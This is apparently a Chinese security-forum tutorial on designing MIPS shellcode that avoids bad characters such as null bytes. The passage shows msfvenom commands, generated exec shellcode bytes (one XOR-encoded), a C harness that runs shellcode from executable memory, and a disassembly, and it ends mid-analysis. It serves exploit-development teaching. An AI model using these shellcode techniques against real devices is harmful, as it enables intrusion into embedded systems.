---
title: Bad Char 绕过实战：稳定 MIPS Shellcode 的设计方法
url: https://forum.butian.net/share/4757
source: 奇安信攻防社区
date: 2026-02-02
fetch_date: 2026-02-03T04:08:33.754290
---

# Bad Char 绕过实战：稳定 MIPS Shellcode 的设计方法

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### Bad Char 绕过实战：稳定 MIPS Shellcode 的设计方法

* [硬件与物联网](https://forum.butian.net/topic/51)
* [CTF](https://forum.butian.net/topic/52)

在漏洞验证过程中，Shellcode 必须被完整注入并成功执行，但目标程序常因使用 strcpy、sprintf 等字符串函数，或协议解析与输入校验机制，对 \x00 等坏字符进行截断或过滤，导致载荷失效。该问题不仅影响传统栈溢出利用，在 ROP 场景下同样突出：部分 gadget 地址包含坏字节，难以完整写入，迫使攻击者通过运行时计算等方式绕过，显著增加利用复杂度。因此，准确识别坏字符并制定规避策略，是构造稳定 Shellcode 的关键。本文将结合 msfvenom 的局限性，介绍实战绕过方法。

引言
==
在漏洞验证过程中，\*\*Shellcode\*\* 作为实现任意代码执行的核心载荷，其字节序列必须能够\*\*完整、无损地注入目标进程并被成功执行\*\*。然而，现实环境中目标程序对外部输入的处理往往伴随着各种限制条件：例如，`strcpy`、`sprintf` 等 C 标准库函数会将 \*\*空字节（\*\*`\x00`\*\*）视为字符串结束符\*\*，一旦在输入中出现，后续数据便会被直接截断；此外，部分协议解析逻辑、输入校验机制或安全防护措施，还可能对特定“危险字符”进行过滤、转义或拒绝处理。若 Shellcode 中包含这些受限字节，极易导致载荷被截断、破坏甚至完全失效，从而使利用过程功亏一篑。
这一问题不仅存在于传统的\*\*栈溢出型 Shellcode 注入\*\*场景中，在现代利用技术（如 \*\*ROP，Return-Oriented Programming\*\*）下同样尤为突出。一方面，许多可用 gadget 的地址本身就可能包含 `\x00` 或其他坏字节，在通过 `strcpy`、`sprintf` 等以空字节为终止符的函数写入时，地址无法被完整拷贝，直接导致 ROP 链构造失败；另一方面，为规避这些坏字节，攻击者往往需要引入额外的 gadget，通过\*\*逐字节写入、地址拼接或运行时计算\*\*等方式间接构造目标地址或参数。这类方案不仅显著增加了 ROP 链的长度和复杂度，也大幅提升了 gadget 搜索、链条设计与调试的时间成本。
因此，\*\*准确识别目标环境中的坏字节，并针对性地制定规避策略\*\*，是编写稳定、可靠 Shellcode 乃至构造高成功率利用链的关键前提。下文将围绕 \*\*msfvenom 在坏字节处理方面的局限性\*\*，系统分析其常见缺陷、实际影响，并结合实战场景介绍有效的绕过思路与技巧。
一、MIPS 寄存器及常用指令描述
=================
| | | | |
|---|---|---|---|
| \*\*类别\*\* | \*\*名称/助记符\*\* | \*\*作用描述\*\* | \*\*技术细节/约定\*\* |
| \*\*寄存器\*\* | `$zero`(0) | \*\*为 0\*\* | 无法被修改，常用于清零操作或简单的数值拷贝。 |
| \*\*寄存器\*\* | `$v0 - $v1`(2-3) | \*\*结果与调用号\*\* | `$v0` 用于存储系统调用号（syscall）或函数的第一个返回值。 |
| \*\*寄存器\*\* | `$a0 - $a3`(4-7) | \*\*参数传递\*\* | 调用函数时，前四个参数依次存放在这里。 |
| \*\*寄存器\*\* | `$t0 - $t9`(8-15, 24-25) | \*\*临时寄存器\*\* | 随用随写，函数调用时不保证这些值会被保留。 |
| \*\*寄存器\*\* | `$s0 - $s7`(16-23) | \*\*静态寄存器\*\* | 存放长期使用的数据，函数调用前后必须保持原值不变。 |
| \*\*寄存器\*\* | `$sp`(29) | \*\*栈指针\*\* | 指向当前内存栈的顶部（向低地址增长）。 |
| \*\*寄存器\*\* | `$ra`(31) | \*\*返回地址\*\* | 保存子程序执行完后应当返回的指令位置。 |
| --- | --- | --- | --- |
| \*\*算术指令\*\* | `add / addu` | \*\*加法\*\* | `add` 会检查溢出，`addu`（无符号）则不检查。 |
| \*\*算术指令\*\* | `sub / subu` | \*\*减法\*\* | 寄存器减法。MIPS 没有 `subi`，减常数通常用 `addi`加负数。 |
| \*\*算术指令\*\* | `addi / addiu` | \*\*立即数加法\*\* | 将寄存器值与一个 16 位常数相加。 |
| \*\*访存指令\*\* | `lw / sw` | \*\*加载 / 存储字\*\* | `lw`: 内存 → 寄存器；`sw`: 寄存器 → 内存。 |
| \*\*跳转指令\*\* | `beq / bne` | \*\*条件分支\*\* | 相等（Equal）或不等（Not Equal）则跳转。 |
| \*\*跳转指令\*\* | `j / jal` | \*\*直接跳转\*\* | `j` 纯跳转；`jal` 跳转并链接（将返回地址存入 `$ra`）。 |
| \*\*跳转指令\*\* | `bltzal` | \*\*小于零跳转并链接\*\* | li $a2, 1638; bltzal $a2, 0 这里 `$a2` 是 1638（大于 0），所以 `bltzal` 的跳转不会发生。 利用这一点获取当前代码地址， 这是经典 \*\*MIPS 获取 PC 技巧。\*\* |
| \*\*系统指令\*\* | `syscall` | \*\*系统调用\*\* | \*\*陷入内核态\*\*。根据 `$v0` 中的值，请求内核执行特定操作（如读写文件、退出程序、执行新程序等）。 |
| \*\*其他\*\* | `li` | \*\*加载立即数\*\* | 伪指令，用于快速给寄存器赋一个常数值。 |
二、MSFVenom 生成 MIPS 架构 Shellcode 的局限性及带参命令执行实践
=============================================
2.1. 初步使用MSFVenom生成mips带参数Shellcode
-----------------------------------
```js
# 下载安装
wget https://apt.metasploit.com/pool/main/m/metasploit-framework/metasploit-framework\_6.4.89~20250916055710~1rapid7-1\_amd64.deb
sudo dpkg -i metasploit-framework\_6.4.89~20250916055710~1rapid7-1\_amd64.deb
# 用法
msfvenom -l payloads | grep linux/arm
msfvenom --platform linux --arch armle -p linux/armle/exec CMD=/bin/ls -f c
msfvenom --platform linux --arch mipsbe -p linux/mipsbe/exec CMD=/bin/ls -f c
No encoder specified, outputting raw payload
Payload size: 52 bytes
Final size of c file: 244 bytes
unsigned char buf[] =
"\x24\x06\x06\x66\x04\xd0\xff\xff\x28\x06\xff\xff\x27\xbd"
"\xff\xe0\x27\xe4\x10\x01\x24\x84\xf0\x1f\xaf\xa4\xff\xe8"
"\xaf\xa0\xff\xec\x27\xa5\xff\xe8\x24\x02\x0f\xab\x01\x01"
"\x01\x0c\x2f\x62\x69\x6e\x2f\x6c\x73\x00";
# hex转汇编命令
echo "2406066604d0ffff2806ffff27bdffe027e410012484f01fafa4ffe8afa0ffec27a5ffe824020fab0101010c2f62696e2f6c7300" | xxd -r -p &gt; mips\_code.bin
/root/tools/mips32--glibc--stable-2024.05-1/bin/mips-buildroot-linux-gnu-objdump -D -b binary -m mips:isa32 --endian=big mips\_code.bin
# msfvenom 生成不含bad的shellcode
msfvenom --platform linux --arch mipsbe -p linux/mipsbe/exec CMD="ls -al" -f c -bad 00 -e mipsbe/byte\_xori
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of mipsbe/byte\_xori
mipsbe/byte\_xori succeeded with size 156 (iteration=0)
mipsbe/byte\_xori chosen with final size 156
Payload size: 156 bytes
Final size of c file: 684 bytes
unsigned char buf[] =
"\x24\x0e\xff\xc6\x01\xc0\x70\x27\x24\x0b\xff\xac\x05\x10"
"\xff\xff\x28\x08\x87\xd5\x01\x60\x58\x27\x03\xeb\xc8\x21"
"\x03\xeb\x80\x21\x28\x17\xed\x9a\x83\x31\xff\xff\x24\x0d"
"\xff\xfc\x01\xa0\x30\x27\x20\xcf\xff\xfe\x83\x28\xff\xfc"
"\x02\xef\xb8\x21\x39\x03\x4a\x4a\x02\xee\xf0\x2b\xa3\x23"
"\xff\xfc\x17\xc0\xff\xfa\x03\x2f\xc8\x21\x26\x04\xff\xfc"
"\x24\x0a\xff\xcb\x01\x40\x28\x27\x24\x02\x10\x33\x01\x4a"
"\x54\x0c\x4a\x4a\x4a\x4a\x6e\x4c\x4c\x2c\x4e\x9a\xb5\xb5"
"\x62\x4c\xb5\xb5\x6d\xf7\xb5\xaa\x6d\xae\x5a\x4b\x6e\xce"
"\xba\x55\xe5\xee\xb5\xa2\xe5\xea\xb5\xa6\x6d\xef\xb5\xa2"
"\x6e\x48\x45\xe1\x4b\x4b\x4b\x46\x26\x39\x6a\x67\x2b\x26"
"\x4a\x4a";
```
在嵌入式设备漏洞验证中，MIPS 架构的 Shellcode 常通过 `msfvenom` 快速生成。然而，`msfvenom` 在生成 \*\*带命令参数的 Shellcode\*\*（如执行 `cat /etc/passwd`、`wget ...` 等）时存在明显缺陷：
\*\*缺乏原生支持\*\*：
msfvenom 提供的 `linux/mipsle/exec` 或 `linux/mipsbe/exec` 等 payload 虽可执行指定程序，但\*\*不支持直接传入多参数命令\*\*（如 `-c "command"`）。用户通常需手动构造完整的 `argv` 数组（包含程序路径、参数、空终止等），而 `msfvenom` 无法自动生成此类复杂结构。
```js
#include
#include
#include
unsigned char shellcode[] =
"\x24\x06\x06\x66\x04\xd0\xff\xff\x28\x06\xff\xff\x27\xbd"
"\xff\xe0\x27\xe4\x10\x01\x24\x84\xf0\x1f\xaf\xa4\xff\xe8"
"\xaf\xa0\xff\xec\x27\xa5\xff\xe8\x24\x02\x0f\xab\x01\x01"
"\x01\x0c\x6c\x73\x20\x2d\x61\x6c\x00\x00";
int main() {
void \*exec\_mem = mmap(NULL, sizeof(shellcode),
PROT\_READ | PROT\_WRITE | PROT\_EXEC,
MAP\_PRIVATE | MAP\_ANONYMOUS, -1, 0);
if (exec\_mem == MAP\_FAILED) {
perror("mmap");
return 1;
}
memcpy(exec\_mem, shellcode, sizeof(shellcode));
printf("Executing shellcode at address: %p\
", exec\_mem);
void (\*func)() = (void(\*)())exec\_mem;
func();
munmap(exec\_mem, sizeof(shellcode));
return 0;
}
```
```js
# 生成shellcode
msfvenom --platform linux --arch mipsbe -p linux/mipsbe/exec CMD="ls" -f c # 能执行
msfvenom --platform linux --arch mipsbe -p linux/mipsbe/exec CMD="ls -al" -f c #不能执行
# 编译成可执行文件
/root/tools/mips32--glibc--stable-2024.05-1/bin/mips-buildroot-linux-gnu-gcc -z execstack -static -g -o mips\_verify\_shellcode mips\_verify\_shellcode.c
# qemu模拟执行
qemu-mips-static mips\_verify\_shellcode
qemu: uncaught target signal 4 (Illegal instruction) - core dumped
[1] 972786 illegal hardware instruction (core dumped) qemu-mips-static mips\_verify\_shellcode
```
执行失败
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-c77d79401d62f76989087760d42c4ef66f3a5609.png)
2.2. 调用号
--------
```jsmsfvenom
echo "2406066604d0ffff2806ffff27bdffe027e410012484f01fafa4ffe8afa0ffec27a5ffe824020fab0101010c6c73202d616c0000" | xxd -r -p &gt; mips\_code.bin
/root/tools/mips32--glibc--stable-2024.05-1/bin/mips-buildroot-linux-gnu-objdump -D -b binary -m mips:isa32 --endian=big mips\_code.bin
mips\_code.bin: file format binary
Disassembly of section .data:
00000000 &lt;.data&gt;:
0: 24060666 li a2,1638
4: 04d0ffff bltzal a2,0x4
8: 2806ffff slti a2,zero,-1
c: 27bdffe0 addiu sp,sp,-32
10: 27e41001 addiu a0,ra,4097
14: 2484f01f addiu a0,a0,-4065
18: afa4ffe8 sw a0,-24(sp)
1c: afa0ffec sw zero,-20(sp)
20: 27a5ffe8 addiu a1,sp,-24
24: 24020fab li v0,4011 # 调用号，...